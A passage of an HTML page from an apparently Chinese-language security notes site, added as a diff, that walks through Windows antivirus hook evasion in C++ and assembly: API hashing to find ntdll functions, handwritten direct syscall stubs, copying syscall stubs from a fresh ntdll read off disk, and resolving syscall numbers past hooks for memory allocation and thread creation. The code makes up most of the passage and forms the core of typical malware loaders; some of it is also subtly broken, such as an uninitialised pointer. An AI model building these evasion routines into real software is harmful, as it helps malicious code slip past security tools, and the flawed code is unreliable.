+            if (dllHash - HashStringW(module-&gt;BaseDllName.Buffer) == 0)
+                return (HMODULE)module-&gt;BaseAddress;
+        }
+        next = next-&gt;Flink;
+    }
+
+    return NULL;
+}
+
+FARPROC _GetProcAddress(_In_ HMODULE dllBase, _In_ ULONG funcHash)
+{
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(dllBase);
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dos + (dos)-&gt;e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    if (exports-&gt;AddressOfNames != 0)
+    {
+        PWORD ordinals = (PWORD)((UINT_PTR)dllBase + exports-&gt;AddressOfNameOrdinals);
+        PDWORD names = (PDWORD)((UINT_PTR)dllBase + exports-&gt;AddressOfNames);
+        PDWORD functions = (PDWORD)((UINT_PTR)dllBase + exports-&gt;AddressOfFunctions);
+
+        for (DWORD i = 0; i &lt; exports-&gt;NumberOfNames; i++) {
+            LPCSTR name = (LPCSTR)((UINT_PTR)dllBase + names[i]);
+            if (HashStringA(name) == funcHash) {
+                PBYTE function = (PBYTE)((UINT_PTR)dllBase + functions[ordinals[i]]);
+                return (FARPROC)function;
+            }
+        }
+    }
+    return NULL;
+}
+
+int main()
+{
+    LPCSTR DLLNAME = &quot;ntdll.dll&quot;;
+    LPCSTR funcname = &quot;NtCreateFile&quot;;
+    ULONG A = HashStringA(DLLNAME);   //HashString传入的参数必须是小写
+    ULONG B = HashStringA(funcname);
+    printf(&quot;A 0x%x\n&quot;, A);
+    printf(&quot;B 0x%x&quot;, B);
+    HMODULE dllBase1 = _GetModuleHandle(HashStringA(DLLNAME));
+    HMODULE dllBase2 = _GetModuleHandle(HashStringNtdll);
+    //HMODULE dllBase3 = _GetModuleHandle(HashStringNtdll1);
+    HMODULE dllBase4 = GetModuleHandleA(&quot;NTDLL.DLL&quot;);
+    if (dllBase1 == NULL)
+    {
+        printf(&quot;Unable to locate base address of 0x%x&quot;, dllBase1);
+    }
+
+
+    FARPROC addr = GetProcAddress(LoadLibraryA(&quot;ntdll&quot;), &quot;NtCreateFile&quot;);
+    FARPROC addr1 = _GetProcAddress(dllBase1, HashNtCreateFile);
+    //_GetProcAddress等同于GetProcAddress；_GetModuleHandle可以当LoadLibraryA来用
+
+
+    return 0;
+
+}
+
+
+</code></pre>
+<h3 id="syscallnthook">手动底层syscall调用NT*函数绕hook</h3>
+<p>https://j00ru.vexillium.org/syscalls/nt/64/</p>
+<p>这个方法是模拟了一个原函数的<code>syscall</code>过程然后对这个函数进行了更名，一定程度上可以绕过杀软的hook。</p>
+<p>可以使用汇编语言编写目标函数的syscall过程，来实现一个功能相同但名称不同的避免被杀软hook的函数的方式。</p>
+<p>本想实现创建进程，由于<code>NTCreateProcess</code>文档没有公开，所以按照教程来实现<code>NtCreateFile</code>函数。</p>
+<p>首先找到<code>NTCreateProcess</code>的系统调用过程的汇编代码</p>
+<p>可以调试一个调了NTDLL.dll的程序，找到函数的过程
+<img alt="" src="../../images/20230726143634.png" /></p>
+<pre><code class="language-asm">0:000&gt; u NtCreateFile
+ntdll!NtCreateFile:
+00007ffb`3770f7e0 4c8bd1          mov     r10,rcx
+00007ffb`3770f7e3 b855000000      mov     eax,55h
+00007ffb`3770f7e8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
+00007ffb`3770f7f0 7503            jne     ntdll!NtCreateFile+0x15 (00007ffb`3770f7f5)
+00007ffb`3770f7f2 0f05            syscall
+00007ffb`3770f7f4 c3              ret
+00007ffb`3770f7f5 cd2e            int     2Eh
+00007ffb`3770f7f7 c3              ret
+
+</code></pre>
+<p>精简一下，可以移除<code>test</code>和<code>jne</code></p>
+<pre><code class="language-asm">.code
+    SysNtCreateFile proc
+            mov r10, rcx
+            mov eax, 55h
+            syscall
+            ret
+    SysNtCreateFile endp
+end
+</code></pre>
+<p>找到<code>NtCreateFile</code>结构体并创建一个相同的<code>SysNtCreateFile</code>结构体，初始化变量，之后就可正常调用<code>SysNtCreateFile</code></p>
+<pre><code class="language-cpp">#include &lt;Windows.h&gt;
+#include &quot;winternl.h&quot;
+#pragma comment(lib, &quot;ntdll&quot;)
+
+EXTERN_C NTSTATUS SysNtCreateFile(
+    PHANDLE FileHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    PLARGE_INTEGER AllocationSize,
+    ULONG FileAttributes,
+    ULONG ShareAccess,
+    ULONG CreateDisposition,
+    ULONG CreateOptions,
+    PVOID EaBuffer,
+    ULONG EaLength);
+
+int main()
+{
+    //FARPROC addr = GetProcAddress(LoadLibraryA(&quot;ntdll&quot;), &quot;NtCreateFile&quot;);
+
+    OBJECT_ATTRIBUTES oa;
+    HANDLE fileHandle = NULL;
+    NTSTATUS status = NULL;
+    UNICODE_STRING fileName;
+    IO_STATUS_BLOCK osb;
+
+    RtlInitUnicodeString(&amp;fileName, (PCWSTR)L&quot;\\??\\c:\\temp\\test.txt&quot;);
+    ZeroMemory(&amp;osb, sizeof(IO_STATUS_BLOCK));
+    InitializeObjectAttributes(&amp;oa, &amp;fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    SysNtCreateFile(
+        &amp;fileHandle,
+        FILE_GENERIC_WRITE,
+        &amp;oa,
+        &amp;osb,
+        0,
+        FILE_ATTRIBUTE_NORMAL,
+        FILE_SHARE_WRITE,
+        FILE_OVERWRITE_IF,
+        FILE_SYNCHRONOUS_IO_NONALERT,
+        NULL,
+        0);
+
+    return 0;
+}
+
+</code></pre>
+<h3 id="ntdlldllhook">从ntdll.dll文件读取函数存根绕hook</h3>
+<p>这个方法是直接从磁盘读取了<code>ntdll</code>并复制了一份到内存中，然后在复制的<code>ntdll</code>中寻找函数的存根，通过修改函数的存根地址，来实现函数不通过原<code>ntdll</code>来实现调用。杀软hook我这份复制的<code>ntdll</code>之前，就已经完成了调用。</p>
+<p>实现过程</p>
+<pre><code>1.读取C:\windows\system32\ntdll.dll文件，另存到内存中
+2.从内存中读取指定函数的.rdata和.text部分
+3.找到指定函数的存根存入内存中
+4.将指定函数的系统调用存根指向新建的内存区域
+5.调用指定函数，实际上调用的是复制出来的内存区域的系统调用存根，通过内存存根再去执行相应的底层调用，跟ntdll存根是一样的，避免了在内存中直接调用ntdll存根
+</code></pre>
+<pre><code class="language-cpp">#include &lt;iostream&gt;
+#include &quot;Windows.h&quot;
+#include &quot;winternl.h&quot;
+#pragma comment(lib, &quot;ntdll&quot;)
+
+int const SYSCALL_STUB_SIZE = 23;
+using myNtCreateFile = NTSTATUS(NTAPI*)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
+
+PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
+{
+    return (PVOID)(RVA - section-&gt;VirtualAddress + section-&gt;PointerToRawData);
+}
+
+BOOL GetSyscallStub(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
+{
+    PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&amp;exportDirectory-&gt;AddressOfNames), rdataSection);
+    PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&amp;exportDirectory-&gt;AddressOfFunctions), rdataSection);
+    BOOL stubFound = FALSE;
+
+    for (size_t i = 0; i &lt; exportDirectory-&gt;NumberOfNames; i++)
+    {
+        DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
+        DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
+        LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
+        if (std::strcmp(functionNameResolved, functionName) == 0)
+        {
+            std::memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
+            stubFound = TRUE;
+        }
+    }
+
+    return stubFound;
+}
+
+int main(int argc, char* argv[]) {
+    char syscallStub[SYSCALL_STUB_SIZE] = {};
+    SIZE_T bytesWritten = 0;
+    DWORD oldProtection = 0;
+    HANDLE file = NULL;
+    DWORD fileSize = NULL;
+    DWORD bytesRead = NULL;
+    LPVOID fileData = NULL;
+
+    // variables for NtCreateFile
+    OBJECT_ATTRIBUTES oa;
+    HANDLE fileHandle = NULL;
+    NTSTATUS status = NULL;
+    UNICODE_STRING fileName;
+    RtlInitUnicodeString(&amp;fileName, (PCWSTR)L&quot;\\??\\c:\\temp\\pwn.log&quot;);
+    IO_STATUS_BLOCK osb;
+    ZeroMemory(&amp;osb, sizeof(IO_STATUS_BLOCK));
+    InitializeObjectAttributes(&amp;oa, &amp;fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    // define NtCreateFile
+    myNtCreateFile NtCreateFile = (myNtCreateFile)(LPVOID)syscallStub;
+    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &amp;oldProtection);
+
+    file = CreateFileA(&quot;c:\\windows\\system32\\ntdll.dll&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    fileSize = GetFileSize(file, NULL);
+    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
+    ReadFile(file, fileData, fileSize, &amp;bytesRead, NULL);
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
+    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader-&gt;e_lfanew);
+    DWORD exportDirRVA = imageNTHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
+    PIMAGE_SECTION_HEADER textSection = section;
+    PIMAGE_SECTION_HEADER rdataSection = section;
+
+    for (int i = 0; i &lt; imageNTHeaders-&gt;FileHeader.NumberOfSections; i++)
+    {
+        if (std::strcmp((CHAR*)section-&gt;Name, (CHAR*)&quot;.rdata&quot;) == 0) {
+            rdataSection = section;
+            break;
+        }
+        section++;
+    }
+
+    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);
+
+    GetSyscallStub(&quot;NtCreateFile&quot;, exportDirectory, fileData, textSection, rdataSection, syscallStub);
+    NtCreateFile(&amp;fileHandle, FILE_GENERIC_WRITE, &amp;oa, &amp;osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+
+    return 0;
+}
+</code></pre>
+<h3 id="syscall-apihash">手动syscall + ApiHash</h3>
+<pre><code class="language-c++">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;Rpc.h&gt;
+#include &lt;winternl.h&gt;
+#include &lt;Ip2string.h&gt;
+#pragma comment(lib, &quot;ntdll&quot;)
+
+#define NtCurrentProcess()     ((HANDLE)-1)
+
+
+#pragma comment(lib, &quot;Rpcrt4.lib&quot;)
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)
+#endif
+
+#define UP -32
+#define DOWN 32
+
+EXTERN_C VOID GetSyscall(WORD systemCall);
+
+EXTERN_C NTSTATUS sysZwAllocateVirtualMemory(
+    HANDLE    ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T   RegionSize,
+    ULONG     AllocationType,
+    ULONG     Protect
+);
+
+EXTERN_C NTSTATUS sysNtProtectVirtualMemory(
+    IN HANDLE ProcessHandle,
+    IN OUT PVOID* BaseAddress,
+    IN OUT PSIZE_T RegionSize,
+    IN ULONG NewProtect,
+    OUT PULONG OldProtect);
+
+EXTERN_C NTSTATUS sysNtCreateThreadEx(
+    OUT PHANDLE hThread,
+    IN ACCESS_MASK DesiredAccess,
+    IN PVOID ObjectAttributes,
+    IN HANDLE ProcessHandle,
+    IN PVOID lpStartAddress,
+    IN PVOID lpParameter,
+    IN ULONG Flags,
+    IN SIZE_T StackZeroBits,
+    IN SIZE_T SizeOfStackCommit,
+    IN SIZE_T SizeOfStackReserve,
+    OUT PVOID lpBytesBuffer
+);
+
+EXTERN_C NTSTATUS sysNtWaitForSingleObject(
+    IN HANDLE         Handle,
+    IN BOOLEAN        Alertable,
+    IN PLARGE_INTEGER Timeout
+);
+
+
+struct LDR_MODULE {
+    LIST_ENTRY e[3];
+    HMODULE base;
+    void* entry;
+    UINT size;
+    UNICODE_STRING dllPath;
+    UNICODE_STRING dllname;
+};
+
+EXTERN_C VOID GetSyscall(WORD systemCall);
+EXTERN_C VOID GetSyscallAddr(INT_PTR syscallAdr);
+
+EXTERN_C NTSTATUS sysNtCreateFile(
+    PHANDLE            FileHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PIO_STATUS_BLOCK   IoStatusBlock,
+    PLARGE_INTEGER     AllocationSize,
+    ULONG              FileAttributes,
+    ULONG              ShareAccess,
+    ULONG              CreateDisposition,
+    ULONG              CreateOptions,
+    PVOID              EaBuffer,
+    ULONG              EaLength
+);
+
+
+
+DWORD calcHash(char* data) {
+    DWORD hash = 0x99;
+    for (int i = 0; i &lt; strlen(data); i++) {
+        hash += data[i] + (hash &lt;&lt; 1);
+    }
+    return hash;
+}
+
+static DWORD calcHashModule(LDR_MODULE* mdll) {
+    char name[64];
+    size_t i = 0;
+
+    while (mdll-&gt;dllname.Buffer[i] &amp;&amp; i &lt; sizeof(name) - 1) {
+        name[i] = (char)mdll-&gt;dllname.Buffer[i];
+        i++;
+    }
+    name[i] = 0;
+    return calcHash((char*)CharLowerA(name));
+}
+
+static HMODULE getModule(DWORD myHash) {
+    HMODULE module;
+    INT_PTR peb = __readgsqword(0x60);
+    auto ldr = 0x18;
+    auto flink = 0x10;
+
+    auto Mldr = *(INT_PTR*)(peb + ldr);
+    auto M1flink = *(INT_PTR*)(Mldr + flink);
+    auto Mdl = (LDR_MODULE*)M1flink;
+    do {
+        Mdl = (LDR_MODULE*)Mdl-&gt;e[0].Flink;
+        if (Mdl-&gt;base != NULL) {
+
+            if (calcHashModule(Mdl) == myHash) {
+                break;
+            }
+        }
+    } while (M1flink != (INT_PTR)Mdl);
+
+    module = (HMODULE)Mdl-&gt;base;
+    return module;
+}
+
+static LPVOID getAPIAddr(HMODULE module, DWORD myHash) {
+
+    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)module;
+    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((LPBYTE)module + DOSheader-&gt;e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY EXdir = (PIMAGE_EXPORT_DIRECTORY)(
+        (LPBYTE)module + NTheader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    PDWORD fAddr = (PDWORD)((LPBYTE)module + EXdir-&gt;AddressOfFunctions);
+    PDWORD fNames = (PDWORD)((LPBYTE)module + EXdir-&gt;AddressOfNames);
+    PWORD  fOrdinals = (PWORD)((LPBYTE)module + EXdir-&gt;AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i &lt; EXdir-&gt;AddressOfFunctions; i++) {
+        LPSTR pFuncName = (LPSTR)((LPBYTE)module + fNames[i]);
+        if (calcHash(pFuncName) == myHash) {
+            return (LPVOID)((LPBYTE)module + fAddr[fOrdinals[i]]);
+        }
+    }
+    return NULL;
+}
+
+WORD Unh00ksyscallNum(LPVOID addr) {
+
+
+    WORD syscall = NULL;
+
+    if (*((PBYTE)addr) == 0x4c
+        &amp;&amp; *((PBYTE)addr + 1) == 0x8b
+        &amp;&amp; *((PBYTE)addr + 2) == 0xd1
+        &amp;&amp; *((PBYTE)addr + 3) == 0xb8
+        &amp;&amp; *((PBYTE)addr + 6) == 0x00
+        &amp;&amp; *((PBYTE)addr + 7) == 0x00) {
+
+        BYTE high = *((PBYTE)addr + 5);
+        BYTE low = *((PBYTE)addr + 4);
+        syscall = (high &lt;&lt; 8) | low;
+
+        return syscall;
+
+    }
+
+    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
+        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {
+
+        for (WORD idx = 1; idx &lt;= 500; idx++) {
+            if (*((PBYTE)addr + idx * DOWN) == 0x4c
+                &amp;&amp; *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
+                &amp;&amp; *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
+                &amp;&amp; *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
+                &amp;&amp; *((PBYTE)addr + 6 + idx * DOWN) == 0x00
+                &amp;&amp; *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
+                BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
+                BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
+                syscall = (high &lt;&lt; 8) | low - idx;
+
+                return syscall;
+            }
+            if (*((PBYTE)addr + idx * UP) == 0x4c
+                &amp;&amp; *((PBYTE)addr + 1 + idx * UP) == 0x8b
+                &amp;&amp; *((PBYTE)addr + 2 + idx * UP) == 0xd1
+                &amp;&amp; *((PBYTE)addr + 3 + idx * UP) == 0xb8
+                &amp;&amp; *((PBYTE)addr + 6 + idx * UP) == 0x00
+                &amp;&amp; *((PBYTE)addr + 7 + idx * UP) == 0x00) {
+                BYTE high = *((PBYTE)addr + 5 + idx * UP);
+                BYTE low = *((PBYTE)addr + 4 + idx * UP);
+                syscall = (high &lt;&lt; 8) | low + idx;
+
+                return syscall;
+
+            }
+
+        }
+
+    }
+}
+
+INT_PTR Unh00ksyscallInstr(LPVOID addr) {
+
+
+    WORD syscall = NULL;
+
+    if (*((PBYTE)addr) == 0x4c
+        &amp;&amp; *((PBYTE)addr + 1) == 0x8b
+        &amp;&amp; *((PBYTE)addr + 2) == 0xd1
+        &amp;&amp; *((PBYTE)addr + 3) == 0xb8
+        &amp;&amp; *((PBYTE)addr + 6) == 0x00
+        &amp;&amp; *((PBYTE)addr + 7) == 0x00) {
+
+        return (INT_PTR)addr + 0x12;    // syscall
+
+    }
+
+    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
+        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {
+
+        for (WORD idx = 1; idx &lt;= 500; idx++) {
+            if (*((PBYTE)addr + idx * DOWN) == 0x4c
+                &amp;&amp; *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
+                &amp;&amp; *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
+                &amp;&amp; *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
+                &amp;&amp; *((PBYTE)addr + 6 + idx * DOWN) == 0x00
+                &amp;&amp; *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
+
+                return (INT_PTR)addr + 0x12;
+            }
+            if (*((PBYTE)addr + idx * UP) == 0x4c
+                &amp;&amp; *((PBYTE)addr + 1 + idx * UP) == 0x8b
+                &amp;&amp; *((PBYTE)addr + 2 + idx * UP) == 0xd1
+                &amp;&amp; *((PBYTE)addr + 3 + idx * UP) == 0xb8
+                &amp;&amp; *((PBYTE)addr + 6 + idx * UP) == 0x00
+                &amp;&amp; *((PBYTE)addr + 7 + idx * UP) == 0x00) {
+
+                return (INT_PTR)addr + 0x12;
+
+            }
+
+        }
+
+    }
+
+}
+
+
+int main()
+{
+    //FARPROC addr = GetProcAddress(LoadLibraryA(&quot;ntdll&quot;), &quot;NtCreateFile&quot;);
+
+    //GetModuleHandle   用apihash获取ntdll.dll句柄
+    HMODULE dllBase1 = getModule(0x3E8557);
+    HMODULE dllBase2 = GetModuleHandleA(&quot;ntdll.dll&quot;);
+
+    //GetProcAddress  用apihash获取ZwAllocateVirtualMemory函数基址
+    LPVOID addr1 = getAPIAddr(dllBase1, 0x112da6be2b35);
+    LPVOID addr2 = GetProcAddress(dllBase2, &quot;ZwAllocateVirtualMemory&quot;);
+
+    //获取ZwAllocateVirtualMemory函数的syscall的编号和syscall地址
+    LPVOID addr;
+    WORD syscallNum = Unh00ksyscallNum(addr);
+    INT_PTR syscallAddr = Unh00ksyscallInstr(addr);
+
+    //syscall
+    GetSyscall(syscallNum);
+    GetSyscallAddr(syscallAddr);
+
+    //syscall之后正常使用函数，需要在asm中实现syscall过程
+    PVOID BaseAddress = NULL;
+    SIZE_T dwSize = 0x2000;
+    NTSTATUS status1 = sysZwAllocateVirtualMemory(NtCurrentProcess(), &amp;BaseAddress, 0, &amp;dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!NT_SUCCESS(status1)) {
+        return 0;
+    }
+
+    return 0;
+}
+</code></pre>
+<pre><code class="language-asm">.data
+    systemCall WORD 000h
+    syscallAddr QWORD 0h
+
+.code
+
+    GetSyscall proc
+                    mov systemCall, cx
+                    ret
+    GetSyscall endp
+
+    GetSyscallAddr proc
+            mov syscallAddr, rcx
+            ret
+    GetSyscallAddr endp
+
+    sysZwAllocateVirtualMemory proc
+                    mov r10, rcx
+                    mov ax, systemCall
+                    jmp qword ptr syscallAddr
+                    ret
+    sysZwAllocateVirtualMemory endp
+
+    sysNtProtectVirtualMemory proc
+                    mov r10, rcx
+                    mov ax, systemCall
+                    jmp qword ptr syscallAddr
+                    ret
+    sysNtProtectVirtualMemory endp
+
+    sysNtCreateThreadEx proc
+                    mov r10, rcx
+                    mov ax, systemCall
+                    jmp qword ptr syscallAddr
+                    ret
+    sysNtCreateThreadEx endp
+
+    sysNtWaitForSingleObject proc
+                    mov r10, rcx
+                    mov ax, systemCall
+                    jmp qword ptr syscallAddr
+                    ret
+    sysNtWaitForSingleObject endp
+
+end
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/" class="btn btn-xs btn-link">
+        反调试与反虚拟机
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../svchost%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88WIN10%201703%E4%B9%8B%E5%90%8E%E6%97%A0%E6%95%88%EF%BC%89/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../svchost%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88WIN10%201703%E4%B9%8B%E5%90%8E%E6%97%A0%E6%95%88%EF%BC%89/" class="btn btn-xs btn-link">
+        svchost权限维持（WIN10 1703之后无效）
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
